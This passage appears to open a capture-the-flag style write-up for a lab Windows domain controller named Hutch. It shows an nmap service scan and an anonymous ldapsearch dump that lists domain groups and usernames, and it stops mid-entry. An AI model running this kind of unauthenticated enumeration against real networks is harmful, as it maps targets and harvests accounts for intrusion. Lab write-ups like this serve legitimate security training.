## First enumeration with nmap 

```shell
# Nmap 7.94SVN scan initiated Tue Feb 27 15:20:28 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -Pn 192.168.154.122
Nmap scan report for 192.168.154.122
Host is up (0.13s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/10.0
|   Server Date: Tue, 27 Feb 2024 14:21:32 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|_  WebDAV type: Unknown
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-27 14:21:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 37s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-27T14:21:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 27 15:21:40 2024 -- 1 IP address (1 host up) scanned in 71.95 seconds
```


## Enumerating ldap 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Hutch]                              
└─$ ldapsearch -x -H ldap://192.168.154.122 -b 'DC=hutch,DC=offsec'
# extended LDIF
#
# LDAPv3
# base <DC=hutch,DC=offsec> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# hutch.offsec
dn: DC=hutch,DC=offsec

# Administrator, Users, hutch.offsec
dn: CN=Administrator,CN=Users,DC=hutch,DC=offsec

# Guest, Users, hutch.offsec
dn: CN=Guest,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052540.0Z
whenChanged: 20201104052540.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsec
uSNChanged: 8197
name: Guest
objectGUID:: VKtEAAOQ8ki8PKRBs7xH+A==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGn9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# krbtgt, Users, hutch.offsec
dn: CN=krbtgt,CN=Users,DC=hutch,DC=offsec

# Domain Computers, Users, hutch.offsec
dn: CN=Domain Computers,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Domain Computers
description: All workstations and servers joined to the domain
distinguishedName: CN=Domain Computers,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12330
uSNChanged: 12332
name: Domain Computers
objectGUID:: SuBXv87h/Uq0hS9itdhc7g==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnAwIAAA==
sAMAccountName: Domain Computers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Controllers, Users, hutch.offsec
dn: CN=Domain Controllers,CN=Users,DC=hutch,DC=offsec

# Schema Admins, Users, hutch.offsec
dn: CN=Schema Admins,CN=Users,DC=hutch,DC=offsec

# Enterprise Admins, Users, hutch.offsec
dn: CN=Enterprise Admins,CN=Users,DC=hutch,DC=offsec

# Cert Publishers, Users, hutch.offsec
dn: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Cert Publishers
description: Members of this group are permitted to publish certificates to th
 e directory
distinguishedName: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12342
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offse
 c
uSNChanged: 12344
name: Cert Publishers
objectGUID:: 6pR13+h/v0CBSMnRpjymjA==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnBQIAAA==
sAMAccountName: Cert Publishers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Admins, Users, hutch.offsec
dn: CN=Domain Admins,CN=Users,DC=hutch,DC=offsec

# Domain Users, Users, hutch.offsec
dn: CN=Domain Users,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Domain Users
description: All domain users
distinguishedName: CN=Domain Users,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12348
memberOf: CN=Users,CN=Builtin,DC=hutch,DC=offsec
uSNChanged: 12350
name: Domain Users
objectGUID:: 0zyAAvzt1UOKBKbf0N6FQQ==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnAQIAAA==
sAMAccountName: Domain Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Guests, Users, hutch.offsec
dn: CN=Domain Guests,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Domain Guests
description: All domain guests
distinguishedName: CN=Domain Guests,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12351
memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsec
uSNChanged: 12353
name: Domain Guests
objectGUID:: 8IN1upAPCUqFJVGtzCE2ew==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnAgIAAA==
sAMAccountName: Domain Guests
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Group Policy Creator Owners, Users, hutch.offsec
dn: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Group Policy Creator Owners
description: Members in this group can modify group policy for the domain
member: CN=Administrator,CN=Users,DC=hutch,DC=offsec
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12354
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offse
 c
uSNChanged: 12391
name: Group Policy Creator Owners
objectGUID:: CC/2IAwkpk+RkSicEUmVCA==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnCAIAAA==
sAMAccountName: Group Policy Creator Owners
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# RAS and IAS Servers, Users, hutch.offsec
dn: CN=RAS and IAS Servers,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: RAS and IAS Servers
description: Servers in this group can access remote access properties of user
 s
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12357
uSNChanged: 12359
name: RAS and IAS Servers
objectGUID:: jwjGdt4Qfk2M0XMn8FMiVg==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnKQIAAA==
sAMAccountName: RAS and IAS Servers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Allowed RODC Password Replication Group, Users, hutch.offsec
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Allowed RODC Password Replication Group
description: Members in this group can have their passwords replicated to all 
 read-only domain controllers in the domain
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=hutc
 h,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12402
uSNChanged: 12404
name: Allowed RODC Password Replication Group
objectGUID:: 5ErycQkHo02pMg1/xxJNIQ==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnOwIAAA==
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Denied RODC Password Replication Group, Users, hutch.offsec
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Denied RODC Password Replication Group
description: Members in this group cannot have their passwords replicated to a
 ny read-only domain controllers in the domain
member: CN=Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
member: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
member: CN=Domain Admins,CN=Users,DC=hutch,DC=offsec
member: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
member: CN=Enterprise Admins,CN=Users,DC=hutch,DC=offsec
member: CN=Schema Admins,CN=Users,DC=hutch,DC=offsec
member: CN=Domain Controllers,CN=Users,DC=hutch,DC=offsec
member: CN=krbtgt,CN=Users,DC=hutch,DC=offsec
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch
 ,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12405
uSNChanged: 12433
name: Denied RODC Password Replication Group
objectGUID:: I0YqHi+34U+yrPKy8jL7YA==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnPAIAAA==
sAMAccountName: Denied RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Read-only Domain Controllers, Users, hutch.offsec
dn: CN=Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec

# Enterprise Read-only Domain Controllers, Users, hutch.offsec
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Enterprise Read-only Domain Controllers
description: Members of this group are Read-Only Domain Controllers in the ent
 erprise
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=hutc
 h,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12429
uSNChanged: 12431
name: Enterprise Read-only Domain Controllers
objectGUID:: xkuEQsOH+UekvpicNYDyqw==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGn8gEAAA==
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Cloneable Domain Controllers, Users, hutch.offsec
dn: CN=Cloneable Domain Controllers,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Cloneable Domain Controllers
description: Members of this group that are domain controllers may be cloned.
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12440
uSNChanged: 12442
name: Cloneable Domain Controllers
objectGUID:: IOOLFwbLHU+szn+H1kGShg==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnCgIAAA==
sAMAccountName: Cloneable Domain Controllers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Protected Users, Users, hutch.offsec
dn: CN=Protected Users,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: Protected Users
description: Members of this group are afforded additional protections against
  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
 298939 for more information.
distinguishedName: CN=Protected Users,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052623.0Z
whenChanged: 20201104052623.0Z
uSNCreated: 12445
uSNChanged: 12447
name: Protected Users
objectGUID:: mA4Fn/4sO0q/fsDXx5HOhg==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnDQIAAA==
sAMAccountName: Protected Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
isCriticalSystemObject: TRUE
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 20201104052623.0Z
dSCorePropagationData: 16010101000417.0Z

# Key Admins, Users, hutch.offsec
dn: CN=Key Admins,CN=Users,DC=hutch,DC=offsec

# Enterprise Key Admins, Users, hutch.offsec
dn: CN=Enterprise Key Admins,CN=Users,DC=hutch,DC=offsec

# DnsAdmins, Users, hutch.offsec
dn: CN=DnsAdmins,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: DnsAdmins
description: DNS Administrators Group
distinguishedName: CN=DnsAdmins,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052702.0Z
whenChanged: 20201104052702.0Z
uSNCreated: 12486
uSNChanged: 12488
name: DnsAdmins
objectGUID:: oohK2PE1PUydvjjBS/KBzw==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnTQQAAA==
sAMAccountName: DnsAdmins
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# DnsUpdateProxy, Users, hutch.offsec
dn: CN=DnsUpdateProxy,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: group
cn: DnsUpdateProxy
description: DNS clients who are permitted to perform dynamic updates on behal
 f of some other clients (such as DHCP servers).
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104052702.0Z
whenChanged: 20201104052702.0Z
uSNCreated: 12491
uSNChanged: 12491
name: DnsUpdateProxy
objectGUID:: QVU11mCC40GAeAjr+EUd7w==
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnTgQAAA==
sAMAccountName: DnsUpdateProxy
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Rosaline Placidi, Users, hutch.offsec
dn: CN=Rosaline Placidi,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Rosaline Placidi
distinguishedName: CN=Rosaline Placidi,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12759
uSNChanged: 12763
name: Rosaline Placidi
objectGUID:: ZnXcaol0h0O06eCHssgsaw==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417051062737
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnTwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: rplacidi
sAMAccountType: 805306368
userPrincipalName: rplacidi@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Otto Patry, Users, hutch.offsec
dn: CN=Otto Patry,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Otto Patry
distinguishedName: CN=Otto Patry,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12765
uSNChanged: 12769
name: Otto Patry
objectGUID:: Z/B36x+G7EKQOh7bdq2Gdg==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417052162728
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: opatry
sAMAccountType: 805306368
userPrincipalName: opatry@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Lyndsie Taunton, Users, hutch.offsec
dn: CN=Lyndsie Taunton,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Lyndsie Taunton
distinguishedName: CN=Lyndsie Taunton,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12771
uSNChanged: 12775
name: Lyndsie Taunton
objectGUID:: osEKgirap0C06Opb/Wc8lQ==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417052642725
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: ltaunton
sAMAccountType: 805306368
userPrincipalName: ltaunton@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Arlyn Costello, Users, hutch.offsec
dn: CN=Arlyn Costello,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Arlyn Costello
distinguishedName: CN=Arlyn Costello,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12777
uSNChanged: 12781
name: Arlyn Costello
objectGUID:: OdMef64Ah0apX2/LyqiHYA==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417053152725
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: acostello
sAMAccountType: 805306368
userPrincipalName: acostello@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Johnnie Sparwell, Users, hutch.offsec
dn: CN=Johnnie Sparwell,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Johnnie Sparwell
distinguishedName: CN=Johnnie Sparwell,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12783
uSNChanged: 12787
name: Johnnie Sparwell
objectGUID:: y1RU3ceaqEyn1XecBNhkVQ==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417053772722
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: jsparwell
sAMAccountType: 805306368
userPrincipalName: jsparwell@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Ottilie Knee, Users, hutch.offsec
dn: CN=Ottilie Knee,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ottilie Knee
distinguishedName: CN=Ottilie Knee,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12789
uSNChanged: 12793
name: Ottilie Knee
objectGUID:: /bMvDx/e506T4lQ+rB8/FA==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417054332736
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: oknee
sAMAccountType: 805306368
userPrincipalName: oknee@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Joan McKendry, Users, hutch.offsec
dn: CN=Joan McKendry,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Joan McKendry
distinguishedName: CN=Joan McKendry,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12795
uSNChanged: 12799
name: Joan McKendry
objectGUID:: awivgHuoDEKrRWtvGV31rQ==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417054922729
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: jmckendry
sAMAccountType: 805306368
userPrincipalName: jmckendry@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Alexia Victoria, Users, hutch.offsec
dn: CN=Alexia Victoria,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Alexia Victoria
distinguishedName: CN=Alexia Victoria,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12801
uSNChanged: 12805
name: Alexia Victoria
objectGUID:: pYkiH0wnEUGtTvJmed1oTQ==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417055452791
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: avictoria
sAMAccountType: 805306368
userPrincipalName: avictoria@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Jane Frarey, Users, hutch.offsec
dn: CN=Jane Frarey,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Jane Frarey
distinguishedName: CN=Jane Frarey,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12807
uSNChanged: 12811
name: Jane Frarey
objectGUID:: ixEEnk99f0WcwVSNK+e+oA==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417056032732
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: jfrarey
sAMAccountType: 805306368
userPrincipalName: jfrarey@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Editha Aburrow, Users, hutch.offsec
dn: CN=Editha Aburrow,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Editha Aburrow
distinguishedName: CN=Editha Aburrow,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12813
uSNChanged: 12817
name: Editha Aburrow
objectGUID:: +7Byu5JQuU2TfrLSegT8VQ==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417056522726
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: eaburrow
sAMAccountType: 805306368
userPrincipalName: eaburrow@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Claus Luddy, Users, hutch.offsec
dn: CN=Claus Luddy,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Claus Luddy
distinguishedName: CN=Claus Luddy,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12819
uSNChanged: 12823
name: Claus Luddy
objectGUID:: XXbxCiLxHkKjA7Pd0VTq1A==
userAccountControl: 512
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132489417057032735
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: cluddy
sAMAccountType: 805306368
userPrincipalName: cluddy@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z

# Arthur Gitthouse, Users, hutch.offsec
dn: CN=Arthur Gitthouse,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Arthur Gitthouse
distinguishedName: CN=Arthur Gitthouse,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20201104053505.0Z
uSNCreated: 12825
uSNChanged: 12829
name: Arthur Gitthouse
